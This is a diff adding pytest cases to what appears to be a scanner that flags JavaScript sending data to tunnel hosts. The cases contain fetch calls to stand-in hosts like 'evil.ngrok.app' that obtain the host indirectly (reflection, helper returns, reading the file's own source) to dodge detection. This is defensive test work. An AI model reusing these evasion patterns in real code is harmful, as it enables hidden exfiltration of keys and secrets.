@@ -243,3 +243,44 @@ def test_value_reaches_network_unit():
     assert _value_reaches_network(["x: 'a', fetch(u)"], {"x"}, (0, 0))  # sink on the line
     assert _psl_markers(['"*.ck",'], 0, 0) and _psl_markers(["// ===BEGIN ICANN DOMAINS==="], 0, 0)
     assert not _psl_markers(['"host1.example.app",', '"ngrok.io",'], 0, 1)
+
+
+# Reads that never name the holder: reflection over the enclosing object, a helper's
+# return value, an export, `this`, the file's own source. Each must keep its critical.
+@pytest.mark.parametrize("code", [
+    _KEY + "function cfg() {\n  return {\n    placeholder: 'evil.ngrok.app',\n  };\n}\n"
+    "fetch('https://' + Object.values(cfg())[0]" + _POST,
+    _KEY + "const cfg = {\n  allowedHosts: [\n    \".ngrok.io\",\n  ],\n};\n"
+    "fetch('https://x' + Object.values(cfg)[0][0]" + _POST,
+    _KEY + "const cfg = {\n  allowedHosts: [\n    \".ngrok.io\",\n  ],\n};\n"
+    "const all = { ...cfg };\nfetch('https://x' + all.allowedHosts[0]" + _POST,
+    _KEY + "const cfg = {\n  allowedHosts: [\n    \".ngrok.io\",\n  ],\n};\nsend(cfg);\n"
+    "function send(c) { return fetch('https://x' + c.allowedHosts[0]" + _POST.rstrip(";\n")
+    + "; }\n",
+    _KEY + _psl(_FILLER[:120] + ["*.ck", "!www.ck", "evil.ngrok.io"] + _FILLER[120:])
+    .replace("module.exports = [", "const rules = {\n\tpsl: [").replace("\t];\n", "\t],\n};\n")
+    + "fetch('https://' + Object.values(rules)[0].find((h) => h.startsWith('evil'))" + _POST,
+    _KEY + "function rules() {\n  return " + _psl(
+        _FILLER[:120] + ["*.ck", "!www.ck", "evil.ngrok.io"] + _FILLER[120:])
+    .replace('var require_rules = __commonJS3({ "node_modules/psl/data/rules.json"'
+             '(exports, module) {\n\tmodule.exports = [', "{\n\tpsl: [")
+    .replace("\t];\n} });\n", "\t],\n};\n}\n")
+    + "fetch('https://' + Object.values(rules())[0].find((h) => h.startsWith('evil'))" + _POST,
+    "module.exports = {\n  placeholder: 'evil.ngrok.app',\n};\n",
+    "const o = {\n  placeholder: 'evil.ngrok.app',\n};\nexport default o;\n",
+    _KEY + "class W {\n  setup() {\n    this.tips = {\n"
+    "      host: 'enter a bare hostname, e.g. evil.ngrok.app',\n    };\n  }\n}\n",
+    _KEY + "const o = { placeholder: 'evil.ngrok.app' };\n"
+    "const h = require('fs').readFileSync(__filename, 'utf8').match(/[a-z]+[.]ngrok[.]app/)[0];\n"
+    "fetch('https://' + h" + _POST,
+])
+def test_tunnel_data_read_without_its_name_stays_critical(code):
+    assert "critical" in _sevs(code, "dist/x.js"), code
+
+
+def test_enclosing_object_member_access_stays_low():
+    # `server.port` reads another key of the object; the allowlist itself is untouched.
+    code = ("const r = await fetch(location.href, {cache: 'no-store'});\n"
+            "const server = {\n  port: 5173,\n  allowedHosts: options.allowedHosts ?? [\n"
+            "    \".ngrok.io\",\n  ],\n};\nif (server.port === 0) log('random port');\n")
+    assert _sevs(code, "dist/x.js") == ["low"]
